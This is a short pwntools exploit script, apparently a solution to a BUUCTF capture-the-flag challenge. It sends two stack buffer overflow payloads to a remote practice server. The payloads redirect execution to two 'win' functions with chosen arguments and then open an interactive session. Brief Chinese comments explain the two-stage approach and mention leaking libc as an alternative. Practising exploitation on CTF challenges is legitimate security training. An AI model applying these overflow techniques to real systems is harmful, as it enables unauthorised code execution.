from pwn import *

io = remote('node4.buuoj.cn', 25871)

win1 = 0x80485cb
win2= 0x80485d8
flag = 0x804862b

# 要求执行两个win函数并且控制两个参数，发一次payload是不能完成的，所以得发两次

payload1 = b'a'*(0x18+4)+p32(win1)+p32(0x8048714)
io.sendlineafter(b'Enter your input> ', payload1)
payload2 = b'a'*(0x18+4)+p32(win2)+p32(flag)+p32(0xbaaaaaad)+p32(0xdeadbaad)
io.sendlineafter(b'Enter your input> ', payload2)
io.interactive()

# 感觉也可以泄露libc来做